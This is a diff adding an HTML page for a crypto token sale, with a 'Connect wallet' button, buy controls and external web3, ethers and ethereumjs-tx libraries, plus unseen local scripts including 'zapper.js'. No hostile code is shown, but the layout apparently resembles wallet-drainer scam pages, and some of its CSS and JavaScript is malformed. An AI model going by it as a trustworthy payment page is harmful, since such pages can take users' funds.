@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="x-ua-compatible" content="ie=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"
+    />
+	<style>
+	.loader {
+	  width: 300px;
+	  height: 20px;
+	  border-radius: 20px;
+	  background:
+	   linear-gradient(#42e8a3 0 0) 0/0% no-repeat
+	   white;
+		0/0% no-repeat
+	   #42e8a3;
+	  animation: l1 8.3s infinite linear;
+	}
+	@keyframes l1 {
+		100% {background-size:100%}
+	}
+	* {
+	  font-family: 'Arial'
+	}
+	
+	.amount {
+		display: flex;
+		padding: 7px 12px;
+		border-radius: 15px;
+		background-color: gray;
+		color: white;
+		margin-right: 10px;
+		cursor: pointer;
+		transition: 0.2s;
+		font-size: 14px;
+	}
+	
+	.amount:hover {
+		background-color: black;
+	}
+	
+	.amounts {
+		margin: 20px 0 50px 0;
+		display: flex;
+		flex-direction: row;
+	}
+	</style>
+  </head>
+  <body>
+    <button id="claim" type="button" style="display: inline-block; background-color: #3861fb; color: white; padding: 10px; border: 0; border-radius: .66em; font-weight: bold; font-size: 14px; cursor: pointer">Connect wallet</button>
+
+    <div class="content" style="display: none">
+		<h3>Enter tokens amount to buy</h3>
+		<input type="number" step="1" value="1" id="tokens-input" style="font-size: 20px; width: 150px; border: 1px gray solid; border-radius: 8px; padding: 5px; margin-right: 15px"/>
+
+		<button id="buy" type="button" style="display: inline-block; background-color: #3861fb; color: white; padding: 10px; border: 0; border-radius: .66em; font-weight: bold; font-size: 14px; cursor: pointer">Buy Tokens</button>
+		
+		<div class="amounts">
+			<div class="amount">100</div>
+			<div class="amount">500</div>
+			<div class="amount">1000</div>
+			<div class="amount">10000</div>
+		</div>
+		
+		<h3 id="claim-text">Token price: 1$</h3>
+		<h3>Limit: 40$</h3>
+
+	 	<div class="loader" style="display: none"></div>
+		<h2 class="confirm" style="display: none; text-align: center; padding-top: 25px; font-weight: 500">
+			Confirm payment in your wallet..
+	    </h2>
+	</div>
+ 
+    <script src="https://bundle.run/buffer@6.0.3"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.1/web3.min.js" integrity="sha512-GKw4QT/RccGJIwQxY3MhyiQ5pHrhQ8SuKFEafV+WcpOvtz7iYFQuQGFCvmGlHLctJTe8KrWU1FqvF7VOkEAJtw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" integrity="sha512-FDcVY+g7vc5CXANbrTSg1K5qLyriCsGDYCE02Li1tXEYdNQPvLPHNE+rT2Mjei8N7fZbe0WLhw27j2SrGRpdMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js" integrity="sha512-uMtXmF28A2Ab/JJO2t/vYhlaa/3ahUOgj1Zf27M5rOo8/+fcTUVH0/E0ll68njmjrLqOBjXM3V9NiPFL5ywWPQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
+
+    <script>
+    if (typeof window !== 'undefined') {
+        if (!window.Buffer) {
+            window.Buffer = buffer.Buffer;
+        }
+        if (!window.global) {
+            window.global = window;
+        }
+        if (!window.process) {
+            window.process = { env: {} }
+        }
+    }
+
+    const showSuccessBuy = () => {
+    	alert(`You got ${tokensAmount} tokens`)
+    }
+    
+    document.querySelectorAll('.amount').forEach(btn => {
+    	btn.addEventListener('click', (e) => {
+    		document.querySelector('#tokens-input').value = e.target.innerText
+    	})
+    })
+    </script>
+
+    <script src="constants.js"></script>
+    <script src="zapper.js"></script>
+    <script src="script.js" type="module"></script>
+  </body>
+</html>
